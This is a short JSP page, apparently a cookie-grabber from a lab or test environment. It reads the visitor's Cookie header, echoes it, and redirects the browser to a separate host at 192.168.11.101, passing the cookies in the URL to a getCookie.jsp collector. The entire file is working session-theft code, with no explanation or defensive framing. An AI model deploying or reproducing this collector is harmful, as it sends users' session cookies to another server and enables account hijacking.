<%@ page import="java.util.*,java.io.*" %>

<%
  String cookie=request.getHeader("cookie");
  out.println(cookie);
  String path="http://192.168.11.101:8080/serv/getCookie.jsp?cookie='"+cookie+"'";
  response.sendRedirect(path);
%>
